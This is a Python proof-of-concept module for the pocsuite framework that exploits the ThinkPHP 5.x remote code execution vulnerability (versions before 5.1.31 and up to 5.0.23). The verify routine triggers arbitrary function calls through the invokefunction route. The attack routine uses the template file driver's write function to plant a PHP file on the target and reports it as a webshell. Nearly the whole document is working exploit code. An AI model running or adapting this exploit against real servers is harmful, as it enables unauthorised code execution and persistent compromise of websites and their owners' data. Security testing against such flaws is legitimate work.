#!/usr/bin/env python
# coding: utf-8

import urllib
import random
import string
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from collections import OrderedDict

class ThinkPHP(POCBase):
    vulID = '1024'
    version = '1'
    author = 'rvn0sxy@gmail.com'
    vulDate = '2018-12-10'
    createDate = '2018-12-11'
    updateDate = '2018-12-11'
    references = ['https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ']
    name = 'Thinkphp 5.x < 5.1.31, <= 5.0.23 远程代码执行'
    appPowerLink = 'https://www.thinkphp.cn/'
    appName = 'Thinkphp'
    appVersion = '5.x < 5.1.31, <= 5.0.23'
    vulType = 'Remote code Execute'
    desc = '近日thinkphp团队发布了版本更新https://blog.thinkphp.cn/869075，其中修复了一处getshell漏洞。'
    samples = []

    def _attack(self):
            result = {}
            shell_name = str(int(random.random() * 1000))+'.php'
            shell_code = '<?php%20phpinfo();?>'
            vul_url = '%s/?s=index/\\think\\template\driver\\file/write&cacheFile=%s&content=%s' % (self.url,shell_name,shell_code)
            if not self._verify(verify=False):
                return self.parse_attack(result)
            response = req.post(vul_url)
            if response.status_code == 200:
                result['webshell'] = self.url+shell_name
            return self.parse_attack(result)
    def _verify(self,verify=True):
            result = {}
            """
            proxies = {
                "http": "http://127.0.0.1:8080"
            }
            """
            vul_url = '%s/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=1024' % self.url
            response = req.get(vul_url).content
            if '1024' in response:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
            return self.parse_attack(result)
    def parse_attack(self, result):
            output = Output(self)
            if result:
                output.success(result)
            else:
                output.fail("No ... ")
            return output

register(ThinkPHP)
